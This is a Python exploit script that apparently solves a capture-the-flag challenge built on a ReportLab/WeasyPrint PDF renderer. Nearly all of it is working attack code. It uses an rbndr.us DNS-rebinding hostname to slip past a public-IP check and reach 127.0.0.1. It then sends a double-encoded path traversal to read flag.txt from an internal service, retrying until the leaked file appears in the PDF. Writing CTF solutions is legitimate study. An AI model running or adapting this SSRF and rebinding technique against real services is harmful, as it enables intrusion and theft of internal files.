#!/usr/bin/env python3
"""Exploit the ReportLab / WeasyPrint SSRF challenge.

Usage:
    python3 scripts/solve_reportlab.py http://challenge-host/

The frontend checks that the submitted URL resolves to public IPs, then
WeasyPrint resolves and fetches the URL again. A rbndr.us hostname alternates
between a public IP and 127.0.0.1, so repeated attempts eventually pass the
guard and fetch the internal service. The internal Go service double-decodes
the /docs/ path, letting ../../flag.txt escape /srv/docs.
"""

from __future__ import annotations

import argparse
import json
import re
import shutil
import subprocess
import sys
import tempfile
import time
import urllib.error
import urllib.request
from pathlib import Path


FLAG_RE = re.compile(r"SVIUSCG\{[^}]+\}")


def rbndr_host(public_ip: str, private_ip: str = "127.0.0.1") -> str:
    def encode(ip: str) -> str:
        return "".join(f"{int(part):02x}" for part in ip.split("."))

    return f"{encode(private_ip)}.{encode(public_ip)}.rbndr.us"


def extract_pdf_text(pdf: bytes) -> str:
    match = FLAG_RE.search(pdf.decode("latin1", errors="ignore"))
    if match:
        return match.group(0)

    if shutil.which("pdftotext"):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "report.pdf"
            path.write_bytes(pdf)
            out = subprocess.check_output(
                ["pdftotext", "-layout", str(path), "-"],
                stderr=subprocess.DEVNULL,
            )
            return out.decode(errors="ignore")

    return ""


def post_report(target: str, render_url: str, timeout: int) -> bytes:
    endpoint = target.rstrip("/") + "/api/report"
    body = json.dumps({"url": render_url}).encode()
    req = urllib.request.Request(
        endpoint,
        data=body,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return resp.read()


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("target", help="frontend base URL, e.g. http://host:port")
    parser.add_argument(
        "--public-ip",
        default="1.1.1.1",
        help="public IP used for the safe half of rbndr.us resolution",
    )
    parser.add_argument("--attempts", type=int, default=80)
    parser.add_argument("--timeout", type=int, default=8)
    parser.add_argument("--out", default="reportlab-leak.pdf")
    args = parser.parse_args()

    host = rbndr_host(args.public_ip)
    traversal = "%252e%252e%252f%252e%252e%252fflag.txt"
    render_url = f"http://{host}:8080/docs/{traversal}"
    print(f"[+] render URL: {render_url}")

    last_error = None
    for attempt in range(1, args.attempts + 1):
        try:
            pdf = post_report(args.target, render_url, args.timeout)
        except urllib.error.HTTPError as e:
            last_error = f"HTTP {e.code}: {e.read(160).decode(errors='ignore')}"
            print(f"[-] attempt {attempt}: {last_error}")
            time.sleep(0.25)
            continue
        except Exception as e:
            last_error = repr(e)
            print(f"[-] attempt {attempt}: {last_error}")
            time.sleep(0.25)
            continue

        text = extract_pdf_text(pdf)
        match = FLAG_RE.search(text)
        if match:
            print(f"[+] flag: {match.group(0)}")
            return 0

        Path(args.out).write_bytes(pdf)
        print(f"[-] attempt {attempt}: got PDF but no extracted flag; saved {args.out}")
        time.sleep(0.25)

    print(f"[!] exhausted attempts; last error: {last_error}", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
